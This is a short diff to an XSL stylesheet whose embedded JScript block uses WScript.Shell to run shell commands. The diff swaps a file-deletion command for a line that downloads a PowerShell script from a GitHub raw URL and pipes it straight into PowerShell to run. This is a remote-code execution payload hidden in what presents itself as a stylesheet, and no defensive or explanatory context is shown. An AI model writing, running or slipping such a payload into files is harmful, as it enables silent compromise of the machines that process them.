@@ -6,6 +6,6 @@ version="1.0">
 <output method="text"/>
     <ms:script implements-prefix="user" language="JScript">
     <![CDATA[
-    var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /c del c:\\programdata\\1.txt");
+    var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /c powershell irm https://raw.githubusercontent.com/joes233f/ccc/main/a.ps1|powershell");
     ]]> </ms:script>
 </stylesheet>
